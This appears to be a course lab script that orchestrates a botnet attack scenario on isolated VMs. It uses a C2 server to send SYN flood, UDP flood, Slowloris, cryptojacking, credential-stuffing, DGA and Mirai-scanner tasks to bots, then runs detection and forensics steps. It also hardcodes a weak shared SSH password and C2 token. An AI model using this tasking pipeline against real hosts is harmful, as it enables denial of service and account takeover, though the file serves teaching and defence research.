#!/bin/bash
# ====================================================
#  AUA CS 232/337 — Botnet Research Lab
#  run_full_lab.sh — Full Attack Scenario Orchestrator
#
#  Run this from the C2 VM (192.168.100.10) after all
#  VMs are up and the repo is deployed to every VM.
#
#  Prerequisites on every VM:
#    sudo apt install -y python3 python3-pip gcc make \
#         libpcap-dev apache2 libssl-dev tcpdump
#    pip3 install flask scapy psutil pycryptodome matplotlib cowrie
#    Compile: gcc -o bot_agent bot_agent.c -lpthread -lssl -lcrypto
#             gcc -o mirai_scanner mirai_scanner.c -lpthread
#             gcc -o kademlia_p2p kademlia_p2p.c -lpthread -lssl -lcrypto -lm
#
#  Network topology (Host-Only, all isolated):
#    192.168.100.10  c2-server        (run this script here)
#    192.168.100.11  bot-agent-1
#    192.168.100.12  bot-agent-2
#    192.168.100.20  victim-honeypot
#
#  Usage:
#    chmod +x run_full_lab.sh
#    sudo ./run_full_lab.sh           # full run
#    sudo ./run_full_lab.sh --phase 1 # run only Phase 1 (C2)
#    sudo ./run_full_lab.sh --phase 2 # run only Phase 2 (covert)
#    sudo ./run_full_lab.sh --phase 3 # run only Phase 3 (P2P)
# ====================================================

set -e

# ── Colours ──────────────────────────────────────────────────────
RED='\\033[0;31m'; GRN='\\033[0;32m'; YLW='\\033[1;33m'
BLU='\\033[0;34m'; CYN='\\033[0;36m'; NC='\\033[0m'

# ── IPs ──────────────────────────────────────────────────────────
C2_IP="192.168.100.10"
BOT1_IP="192.168.100.11"
BOT2_IP="192.168.100.12"
VICTIM_IP="192.168.100.20"
SSH_PASS="pass"          # password for all VMs (set in your VM install)
SSH_OPTS="-o StrictHostKeyChecking=no -o ConnectTimeout=5"

# ── Helpers ───────────────────────────────────────────────────────
log()  { echo -e "${BLU}[$(date +%H:%M:%S)]${NC} $*"; }
ok()   { echo -e "${GRN}[OK]${NC} $*"; }
warn() { echo -e "${YLW}[WARN]${NC} $*"; }
fail() { echo -e "${RED}[FAIL]${NC} $*"; }

bot_ssh() {
    # Usage: bot_ssh <ip> <command>
    local ip="$1"; shift
    if command -v sshpass &>/dev/null; then
        sshpass -p "$SSH_PASS" ssh $SSH_OPTS "vboxuser@$ip" "$@" 2>/dev/null
    else
        ssh $SSH_OPTS "vboxuser@$ip" "$@" 2>/dev/null
    fi
}

bot_ssh_bg() {
    local ip="$1"; shift
    if command -v sshpass &>/dev/null; then
        sshpass -p "$SSH_PASS" ssh $SSH_OPTS "vboxuser@$ip" "$@" &>/dev/null &
    else
        ssh $SSH_OPTS "vboxuser@$ip" "$@" &>/dev/null &
    fi
}

c2_curl() {
    curl -s -X POST "http://${C2_IP}:5000/task" \
         -H "Content-Type: application/json" \
         -H "X-Auth-Token: aw" \
         -d "$1"
}

wait_for_port() {
    local host="$1" port="$2" label="$3" retries=15
    log "Waiting for $label ($host:$port)..."
    for i in $(seq 1 $retries); do
        if nc -z -w2 "$host" "$port" 2>/dev/null; then
            ok "$label is up"
            return 0
        fi
        sleep 2
    done
    warn "$label did not come up within ${retries}x2s"
    return 1
}

check_isolation() {
    log "Verifying network isolation..."
    if ping -c 1 -W 2 8.8.8.8 &>/dev/null; then
        fail "ISOLATION BREACH: This VM can reach the internet! Aborting."
        exit 1
    fi
    ok "Isolation confirmed (8.8.8.8 unreachable)"
}

check_dependencies() {
    log "Checking local dependencies..."
    for cmd in python3 gcc curl nc; do
        if ! command -v "$cmd" &>/dev/null; then
            fail "Missing: $cmd"
            exit 1
        fi
    done
    for f in c2_server.py ids_detector.py bot_agent covert_bot.py dga.py \
              fake_portal.py cred_stuffing.py cryptojack_sim.py slowloris.py \
              generate_graphs.py honeypot_setup.py mirai_scanner p2p_node.py \
              kademlia_p2p firewall_dpi.py; do
        [ -f "$f" ] || warn "File not found locally: $f (some tests may be skipped)"
    done
    ok "Dependency check done"
}

# ────────────────────────────────────────────────────────────────
# SERVICE STARTUP
# ────────────────────────────────────────────────────────────────

start_c2_server() {
    log "Starting C2 server (Phase 1 Flask)..."
    pkill -f c2_server.py 2>/dev/null || true
    nohup python3 c2_server.py > /tmp/c2_server.log 2>&1 &
    C2_PID=$!
    wait_for_port "$C2_IP" 5000 "C2 server"
    log "C2 server PID: $C2_PID"
}

start_dead_drop_server() {
    log "Starting Phase 2 dead-drop server (port 5001)..."
    pkill -f "covert_bot.py server" 2>/dev/null || true
    nohup python3 covert_bot.py server > /tmp/dead_drop.log 2>&1 &
    sleep 2
    ok "Dead-drop server started"
}

start_fake_portal() {
    log "Starting credential stuffing target (fake portal) on $VICTIM_IP:80..."
    bot_ssh_bg "$VICTIM_IP" "sudo pkill -f fake_portal.py; cd ~/lab && sudo nohup python3 fake_portal.py > /tmp/portal.log 2>&1"
    sleep 3
    ok "Fake portal started on victim VM"
}

start_ids() {
    log "Starting IDS on victim VM ($VICTIM_IP)..."
    bot_ssh_bg "$VICTIM_IP" "sudo pkill -f ids_detector.py; cd ~/lab && sudo nohup python3 ids_detector.py > /dev/null 2>&1"
    sleep 3
    ok "IDS started"
}

start_cowrie() {
    log "Setting up and starting Cowrie honeypot on victim VM..."
    bot_ssh "$VICTIM_IP" "cd ~/lab && sudo python3 honeypot_setup.py --setup && cowrie start" || \
        warn "Cowrie setup may have failed — check victim VM"
    sleep 3
    ok "Cowrie honeypot started (SSH:2222, Telnet:2323)"
}

start_bots_phase1() {
    log "Starting C bot agents on bot VMs (Phase 1 — star C2)..."
    bot_ssh_bg "$BOT1_IP" "cd ~/lab && sudo ./bot_agent > /tmp/bot1.log 2>&1"
    bot_ssh_bg "$BOT2_IP" "cd ~/lab && sudo ./bot_agent > /tmp/bot2.log 2>&1"
    sleep 5
    BOTS=$(curl -s "http://${C2_IP}:5000/bots" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d))" 2>/dev/null || echo "?")
    ok "Bots registered with C2: $BOTS"
}

# ────────────────────────────────────────────────────────────────
# TRAFFIC CAPTURE (NEW)
# Start a tcpdump on the victim VM at the beginning of Phase 1 so
# the resulting pcap can be fed into c2_analyzer.py at the end of
# the run.  The capture runs for the full duration of the attack
# scenarios and is stopped in run_c2_analysis().
# ────────────────────────────────────────────────────────────────

TCPDUMP_PID_FILE="/tmp/lab_tcpdump.pid"
LAB_PCAP_REMOTE="/tmp/lab_capture.pcap"
LAB_PCAP_LOCAL="/tmp/lab_capture.pcap"

start_traffic_capture() {
    log "Starting tcpdump on victim VM to capture lab traffic for c2_analyzer..."
    # Kill any prior capture, start fresh
    bot_ssh "$VICTIM_IP" "sudo pkill -f 'tcpdump.*lab_capture' 2>/dev/null; true"
    bot_ssh_bg "$VICTIM_IP" \
        "sudo tcpdump -i enp0s3 -w $LAB_PCAP_REMOTE \
         'not (host 192.168.100.1 and port 22)' \
         > /tmp/tcpdump.log 2>&1 & echo \$! > $TCPDUMP_PID_FILE"
    sleep 2
    ok "tcpdump capture started on victim VM → $LAB_PCAP_REMOTE"
}

stop_traffic_capture() {
    log "Stopping tcpdump on victim VM..."
    bot_ssh "$VICTIM_IP" \
        "PID=\$(cat $TCPDUMP_PID_FILE 2>/dev/null); [ -n \"\$PID\" ] && sudo kill \"\$PID\" 2>/dev/null; true"
    sleep 3   # let tcpdump flush and close the file
    ok "tcpdump capture stopped"
}

# ────────────────────────────────────────────────────────────────
# ATTACK SCENARIOS
# ────────────────────────────────────────────────────────────────

scenario_pause() {
    echo ""
    echo -e "${CYN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${CYN}  $1${NC}"
    echo -e "${CYN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    sleep 2
}

run_syn_flood() {
    scenario_pause "ATTACK 1/7: SYN Flood (Layer 4 DDoS)"
    log "Pushing SYN flood task to all bots (target: $VICTIM_IP, 20s)..."
    c2_curl "{\"bot_id\":\"all\",\"type\":\"syn_flood\",\"target_ip\":\"$VICTIM_IP\",\"target_port\":80,\"duration\":20}"
    log "SYN flood running for 20s — watch IDS alerts on victim VM"
    log "  tail -f /tmp/ids.log  (on victim VM)"
    sleep 25
    ok "SYN flood complete"
}

run_udp_flood() {
    scenario_pause "ATTACK 2/7: UDP Flood (Layer 4 DDoS)"
    log "Pushing UDP flood task to all bots (target: $VICTIM_IP, 15s)..."
    c2_curl "{\"bot_id\":\"all\",\"type\":\"udp_flood\",\"target_ip\":\"$VICTIM_IP\",\"target_port\":0,\"duration\":15}"
    sleep 20
    ok "UDP flood complete"
}

run_slowloris() {
    scenario_pause "ATTACK 3/7: Slowloris (Layer 7 DDoS)"
    log "Checking Apache thread count before Slowloris..."
    bot_ssh "$VICTIM_IP" "sudo ss -tn | grep :80 | wc -l" | \
        xargs -I{} log "Pre-attack connections to :80 = {}"
    log "Pushing Slowloris task to all bots (target: $VICTIM_IP:80, 30s)..."
    c2_curl "{\"bot_id\":\"all\",\"type\":\"slowloris\",\"target_ip\":\"$VICTIM_IP\",\"target_port\":80,\"duration\":30}"
    sleep 10
    log "Mid-attack connection count:"
    bot_ssh "$VICTIM_IP" "sudo ss -tn | grep :80 | wc -l" | \
        xargs -I{} log "Connections to :80 = {} (Apache workers exhausting...)"
    sleep 25
    ok "Slowloris complete"
}

run_cryptojack() {
    scenario_pause "ATTACK 4/7: Cryptojacking (Silent resource theft)"
    log "Pushing cryptojack task to bot 1 (25% CPU, 30s)..."
    BOT1_ID=$(curl -s "http://${C2_IP}:5000/bots" 2>/dev/null | \
              python3 -c "import sys,json; d=json.load(sys.stdin); print(list(d.keys())[0] if d else 'bot_1')" 2>/dev/null || echo "all")
    c2_curl "{\"bot_id\":\"$BOT1_ID\",\"type\":\"cryptojack\",\"duration\":30,\"cpu\":0.25}"
    sleep 5
    log "CPU usage on bot1 (IDS should detect sustained 25%+):"
    bot_ssh "$BOT1_IP" "ps aux --sort=-%cpu | head -5" || true
    sleep 30
    ok "Cryptojacking simulation complete"
}

run_cred_stuffing() {
    scenario_pause "ATTACK 5/7: Credential Stuffing"
    log "Running credential stuffing from bot1 — bot mode (rigid timing, easily detected)..."
    bot_ssh_bg "$BOT1_IP" "cd ~/lab && python3 cred_stuffing.py \
        --mode bot --host $VICTIM_IP --port 80 --interval 300 --jitter 0"
    sleep 15
    log "Running credential stuffing from bot1 — jitter mode (CV evasion test)..."
    bot_ssh_bg "$BOT1_IP" "cd ~/lab && python3 cred_stuffing.py \
        --mode jitter --host $VICTIM_IP --port 80 --interval 500 --jitter 300"
    sleep 20
    bot_ssh "$BOT1_IP" "sudo pkill -f cred_stuffing.py" 2>/dev/null || true
    ok "Credential stuffing complete"
}

run_dga() {
    scenario_pause "ATTACK 6/7: DGA Domain Generation + IDS Detection"
    log "Running DGA module — bot will iterate NXDOMAIN domains..."
    log "IDS should fire DGA alert after 10+ NXDOMAINs in 30s window"
    python3 dga.py
    sleep 3
    log "Pushing DGA search command via C2..."
    c2_curl "{\"bot_id\":\"all\",\"type\":\"dga_search\",\"duration\":10}"
    sleep 15
    ok "DGA scenario complete"
}

run_mirai_propagation() {
    scenario_pause "ATTACK 7/7: Mirai IoT Propagation"
    log "Starting Mirai scanner from bot1 (targeting $VICTIM_IP honeypot)..."
    log "Cowrie will log all commands. Watch: tail -f cowrie.json on victim VM"
    bot_ssh_bg "$BOT1_IP" "cd ~/lab && sudo ./mirai_scanner > /tmp/mirai_scan.log 2>&1"
    sleep 20
    log "Scanner output (from bot1):"
    bot_ssh "$BOT1_IP" "tail -20 /tmp/mirai_scan.log" 2>/dev/null || true
    sleep 5
    ok "Mirai propagation scenario complete"
}

# ────────────────────────────────────────────────────────────────
# PHASE 2: COVERT CHANNEL
# ────────────────────────────────────────────────────────────────

run_phase2_covert() {
    scenario_pause "PHASE 2: Covert Channel (GitHub Dead Drop)"
    log "Phase 2: Injecting command into dead-drop server..."
    curl -s -X POST "http://${C2_IP}:5001/set_command" \
         -H "Content-Type: application/json" \
         -d "{\"type\":\"syn_flood\",\"target\":\"$VICTIM_IP\",\"duration\":10}" | \
         python3 -m json.tool 2>/dev/null || true

    log "Starting Phase 2 covert bot on bot1..."
    bot_ssh_bg "$BOT1_IP" "cd ~/lab && python3 covert_bot.py > /tmp/covert_bot.log 2>&1"
    sleep 5
    log "Wireshark capture note: bot traffic appears as HTTPS GET to 192.168.100.10:5001"
    sleep 70
    log "Phase 2 covert bot log (from bot1):"
    bot_ssh "$BOT1_IP" "tail -15 /tmp/covert_bot.log" 2>/dev/null || true
    ok "Phase 2 covert channel demonstration complete"
}

# ────────────────────────────────────────────────────────────────
# PHASE 3: P2P KADEMLIA
# ────────────────────────────────────────────────────────────────

run_phase3_p2p() {
    scenario_pause "PHASE 3: Kademlia P2P DHT Botnet"
    log "Starting Kademlia seed node on C2 VM (port 7400)..."
    pkill -f kademlia_p2p 2>/dev/null || true
    nohup ./kademlia_p2p --host "$C2_IP" --port 7400 > /tmp/p2p_seed.log 2>&1 &
    P2P_SEED_PID=$!
    sleep 2

    log "Starting P2P node on bot1..."
    bot_ssh_bg "$BOT1_IP" "cd ~/lab && ./kademlia_p2p --host $BOT1_IP --port 7400 \
        --bootstrap $C2_IP:7400 > /tmp/p2p_bot1.log 2>&1"
    sleep 2

    log "Starting P2P node on bot2..."
    bot_ssh_bg "$BOT2_IP" "cd ~/lab && ./kademlia_p2p --host $BOT2_IP --port 7400 \
        --bootstrap $C2_IP:7400 > /tmp/p2p_bot2.log 2>&1"
    sleep 5

    log "Injecting syn_flood command into DHT via C2 node..."
    ./kademlia_p2p --host "$C2_IP" --port 7401 \
        --bootstrap "$C2_IP:7400" \
        --inject "{\"type\":\"syn_flood\",\"target\":\"$VICTIM_IP\",\"port\":80,\"duration\":10}"
    sleep 35

    log "Resilience demonstration: killing seed node..."
    kill $P2P_SEED_PID 2>/dev/null || true
    sleep 5

    log "P2P nodes on bot1 and bot2 should still communicate..."
    bot_ssh "$BOT1_IP" "tail -10 /tmp/p2p_bot1.log" 2>/dev/null || true

    log "Running local 5-node demo with 40% node kill to show P2P resilience..."
    ./kademlia_p2p --demo
    ok "Phase 3 P2P demonstration complete"
}

# ────────────────────────────────────────────────────────────────
# DEFENSIVE / FORENSIC STEPS
# ────────────────────────────────────────────────────────────────

run_dpi_measurement() {
    scenario_pause "DEFENSE: DPI vs Port Blocking Measurement (Graph 1 data)"
    log "Setting up iptables egress filtering..."
    sudo python3 firewall_dpi.py --setup || true
    sleep 2
    log "Running DPI engine for 120s to collect TTD data..."
    python3 firewall_dpi.py --measure --duration 120 &
    DPI_PID=$!
    c2_curl "{\"bot_id\":\"all\",\"type\":\"syn_flood\",\"target_ip\":\"$VICTIM_IP\",\"duration\":15}"
    sleep 125
    kill $DPI_PID 2>/dev/null || true
    python3 firewall_dpi.py --teardown || true
    ok "DPI measurement complete — see graph1_measured_data.json"
}

run_cowrie_analysis() {
    scenario_pause "DEFENSE: Cowrie Honeypot Forensics"
    log "Analyzing Cowrie logs and generating MITRE ATT&CK report..."
    bot_ssh "$VICTIM_IP" "cd ~/lab && python3 honeypot_setup.py --analyze && \
        python3 honeypot_setup.py --report" || \
        warn "Cowrie log analysis failed (may not have data yet)"
    log "Copying IR report from victim VM..."
    if command -v sshpass &>/dev/null; then
        sshpass -p "$SSH_PASS" scp $SSH_OPTS \
            "vboxuser@$VICTIM_IP:~/lab/incident_report.md" \
            /tmp/incident_report.md 2>/dev/null && \
            ok "IR report saved to /tmp/incident_report.md" || \
            warn "Could not copy IR report"
    fi
}

# ────────────────────────────────────────────────────────────────
# GRAPH GENERATION
# ────────────────────────────────────────────────────────────────

generate_all_graphs() {
    scenario_pause "GENERATING RESEARCH GRAPHS (Week 7 output)"
    log "Installing matplotlib if needed..."
    pip3 install matplotlib --quiet 2>/dev/null || true
    mkdir -p /tmp/botnet_graphs
    log "Generating Graph 1 (DPI vs Port Blocking)..."
    log "Generating Graph 2 (Persistence Paradox MTBI)..."
    log "Generating Graph 3 (IDS Accuracy vs Jitter)..."
    python3 -c "
import sys; sys.argv = ['generate_graphs.py']
import generate_graphs
import os
os.makedirs('/tmp/botnet_graphs', exist_ok=True)
generate_graphs.graph1_dpi_vs_portblocking('/tmp/botnet_graphs/graph1_dpi_vs_portblocking.png')
generate_graphs.graph2_persistence_paradox('/tmp/botnet_graphs/graph2_persistence_paradox.png')
generate_graphs.graph3_ids_accuracy('/tmp/botnet_graphs/graph3_ids_accuracy.png')
print('Graphs saved to /tmp/botnet_graphs/')
" 2>/dev/null || python3 generate_graphs.py
    ok "All 3 research graphs generated in /tmp/botnet_graphs/"
    python3 generate_graphs.py --status 2>/dev/null || true
}

# ────────────────────────────────────────────────────────────────
# OFFLINE C2 ANALYSIS (NEW)
# After all attacks complete, fetch the pcap captured on the victim
# VM and run c2_analyzer.py against it.  This connects the attack
# simulation pipeline to the offline C2 detection pipeline that was
# previously a standalone tool with no integration point.
# ────────────────────────────────────────────────────────────────

run_c2_analysis() {
    scenario_pause "OFFLINE C2 ANALYSIS: c2_analyzer.py on captured traffic"

    # ── 1. Stop traffic capture and retrieve the pcap ─────────────
    stop_traffic_capture

    log "Copying captured pcap from victim VM → $LAB_PCAP_LOCAL ..."
    if command -v sshpass &>/dev/null; then
        sshpass -p "$SSH_PASS" scp $SSH_OPTS \
            "vboxuser@$VICTIM_IP:$LAB_PCAP_REMOTE" \
            "$LAB_PCAP_LOCAL" 2>/dev/null || {
            warn "Could not copy pcap from victim VM — skipping c2_analyzer"
            return 1
        }
    else
        scp $SSH_OPTS "vboxuser@$VICTIM_IP:$LAB_PCAP_REMOTE" \
            "$LAB_PCAP_LOCAL" 2>/dev/null || {
            warn "Could not copy pcap (no sshpass, no keys) — skipping c2_analyzer"
            return 1
        }
    fi

    PCAP_SIZE=$(stat -c%s "$LAB_PCAP_LOCAL" 2>/dev/null || echo 0)
    if [ "$PCAP_SIZE" -lt 1024 ]; then
        warn "Pcap too small (${PCAP_SIZE} bytes) — traffic may not have been captured"
        return 1
    fi
    ok "Pcap retrieved: $LAB_PCAP_LOCAL ($(( PCAP_SIZE / 1024 )) KB)"

    # ── 2. Check IOC cache staleness ──────────────────────────────
    log "Checking IOC cache freshness before analysis..."
    python3 c2_analyzer.py --cache-status 2>/dev/null || true

    # ── 3. Run offline C2 analysis ────────────────────────────────
    log "Running c2_analyzer.py on captured lab traffic..."
    log "  Flags: --dga (DGA detection) --threat-feed (C2 feed lookup)"
    log "  Output directory: /tmp/c2_analysis/"
    mkdir -p /tmp/c2_analysis

    python3 c2_analyzer.py \
        -i "$LAB_PCAP_LOCAL" \
        -o /tmp/c2_analysis \
        -s \
        -w \
        --dga \
        --threat-feed \
        --quiet \
        2>/dev/null || {
        warn "c2_analyzer.py encountered errors — check /tmp/c2_analysis/ for partial output"
        return 1
    }

    ok "Offline C2 analysis complete"
    log "Output files:"
    log "  /tmp/c2_analysis/detected_iocs.json      — all detection findings"
    log "  /tmp/c2_analysis/extracted_data.json     — IOCs extracted from pcap"
    log "  /tmp/c2_analysis/c2_analysis_report.html — HTML report"

    # ── 4. Quick summary of what was detected ─────────────────────
    if [ -f /tmp/c2_analysis/detected_iocs.json ]; then
        log "Detection summary:"
        python3 - <<'PYEOF'
import json, sys
try:
    with open("/tmp/c2_analysis/detected_iocs.json") as f:
        d = json.load(f)
    keys = [k for k in d if k not in (
        "filepath","analysis_timestamp","thresholds",
        "aggregated_ip_addresses","aggregated_domain_names","aggregated_urls"
    ) and d[k]]
    if keys:
        print(f"  Detections fired ({len(keys)}): {', '.join(keys)}")
    else:
        print("  No C2 indicators detected in captured traffic")
    agg_ips = d.get("aggregated_ip_addresses", [])
    if agg_ips:
        print(f"  Aggregated public IPs: {', '.join(agg_ips[:5])}"
              + (f" … +{len(agg_ips)-5} more" if len(agg_ips) > 5 else ""))
except Exception as e:
    print(f"  (could not parse output: {e})")
PYEOF
    fi
}

# ────────────────────────────────────────────────────────────────
# CLEANUP
# ────────────────────────────────────────────────────────────────

cleanup_all() {
    log "Cleaning up all running processes..."
    pkill -f c2_server.py   2>/dev/null || true
    pkill -f covert_bot.py  2>/dev/null || true
    pkill -f fake_portal.py 2>/dev/null || true
    pkill -f ids_detector.py 2>/dev/null || true
    pkill -f kademlia_p2p   2>/dev/null || true
    pkill -f cred_stuffing  2>/dev/null || true
    pkill -f cryptojack_sim 2>/dev/null || true
    pkill -f slowloris.py   2>/dev/null || true
    bot_ssh_bg "$BOT1_IP" "sudo pkill -f bot_agent; sudo pkill -f mirai_scanner; sudo pkill -f kademlia_p2p; sudo pkill -f covert_bot"
    bot_ssh_bg "$BOT2_IP" "sudo pkill -f bot_agent; sudo pkill -f kademlia_p2p"
    bot_ssh_bg "$VICTIM_IP" "sudo pkill -f ids_detector; sudo pkill -f fake_portal; cowrie stop; sudo pkill -f tcpdump 2>/dev/null"
    bot_ssh "$VICTIM_IP" "cd ~/lab && python3 tarpit_state.py clear" 2>/dev/null || true
    sudo python3 firewall_dpi.py --teardown 2>/dev/null || true
    sleep 2
    ok "Cleanup complete"
}

# ────────────────────────────────────────────────────────────────
# MAIN FLOW
# ────────────────────────────────────────────────────────────────

PHASE="all"
while [[ $# -gt 0 ]]; do
    case "$1" in
        --phase)   PHASE="$2"; shift 2 ;;
        --phase=*) PHASE="${1#--phase=}"; shift ;;
        --clean)   cleanup_all; exit 0 ;;
        *)         shift ;;
    esac
done

echo ""
echo -e "${RED}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║   AUA CS 232/337 - Full Lab Attack Scenario          ║${NC}"
echo -e "${RED}║   ISOLATED VM NETWORK ONLY — ZERO EXTERNAL ACCESS    ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════╝${NC}"
echo ""

check_isolation
check_dependencies

trap cleanup_all EXIT INT TERM

case "$PHASE" in
    1|"phase1")
        log "Running Phase 1 only (Star C2 + all payloads)"
        start_c2_server
        start_fake_portal
        start_ids
        start_cowrie
        start_bots_phase1
        start_traffic_capture        # NEW: begin pcap capture
        run_syn_flood
        run_udp_flood
        run_slowloris
        run_cryptojack
        run_cred_stuffing
        run_dga
        run_mirai_propagation
        run_dpi_measurement
        run_cowrie_analysis
        generate_all_graphs
        run_c2_analysis              # NEW: offline analysis on captured traffic
        ;;
    2|"phase2")
        log "Running Phase 2 only (Covert channel)"
        start_c2_server
        start_dead_drop_server
        start_ids
        run_phase2_covert
        ;;
    3|"phase3")
        log "Running Phase 3 only (P2P Kademlia)"
        start_ids
        run_phase3_p2p
        ;;
    "all"|*)
        log "Running FULL LAB — all phases and all attacks"
        echo ""
        # ── Phase 1: Star C2 + Payload Suite ──────────────────
        scenario_pause "═══ PHASE 1: CENTRALIZED C2 + FULL PAYLOAD SUITE ═══"
        start_c2_server
        start_fake_portal
        start_ids
        start_cowrie
        start_bots_phase1
        start_traffic_capture        # NEW: begin pcap capture for c2_analyzer
        run_syn_flood
        run_udp_flood
        run_slowloris
        run_cryptojack
        run_cred_stuffing
        run_dga
        run_mirai_propagation
        run_dpi_measurement
        run_cowrie_analysis

        # ── Phase 2: Covert Channel ────────────────────────────
        scenario_pause "═══ PHASE 2: COVERT CHANNEL (DEAD DROP + JA3 MIMICRY) ═══"
        start_dead_drop_server
        run_phase2_covert

        # ── Phase 3: P2P Mesh ──────────────────────────────────
        scenario_pause "═══ PHASE 3: KADEMLIA P2P DHT BOTNET ═══"
        run_phase3_p2p

        # ── Research graphs ────────────────────────────────────
        generate_all_graphs

        # ── Offline C2 analysis on captured traffic (NEW) ──────
        run_c2_analysis

        echo ""
        echo -e "${GRN}╔══════════════════════════════════════════════════════╗${NC}"
        echo -e "${GRN}║   FULL LAB COMPLETE                                  ║${NC}"
        echo -e "${GRN}║                                                      ║${NC}"
        echo -e "${GRN}║   Outputs:                                           ║${NC}"
        echo -e "${GRN}║     Graphs:      /tmp/botnet_graphs/*.png            ║${NC}"
        echo -e "${GRN}║     IR report:   /tmp/incident_report.md             ║${NC}"
        echo -e "${GRN}║     DPI data:    ./graph1_measured_data.json         ║${NC}"
        echo -e "${GRN}║     C2 log:      /tmp/c2_server.log                 ║${NC}"
        echo -e "${GRN}║     IDS log:     /tmp/ids.log (on victim VM)        ║${NC}"
        echo -e "${GRN}║     Cowrie:      ~/.cowrie/var/log/cowrie/cowrie.json║${NC}"
        echo -e "${GRN}║     C2 analysis: /tmp/c2_analysis/ (NEW)            ║${NC}"
        echo -e "${GRN}║       detected_iocs.json                            ║${NC}"
        echo -e "${GRN}║       extracted_data.json                           ║${NC}"
        echo -e "${GRN}║       c2_analysis_report.html                       ║${NC}"
        echo -e "${GRN}║                                                      ║${NC}"
        echo -e "${GRN}║   Real data auto-loaded when JSON files are present  ║${NC}"
        echo -e "${GRN}║   Run: python3 generate_graphs.py --status           ║${NC}"
        echo -e "${GRN}╚══════════════════════════════════════════════════════╝${NC}"
        echo ""
        ;;
esac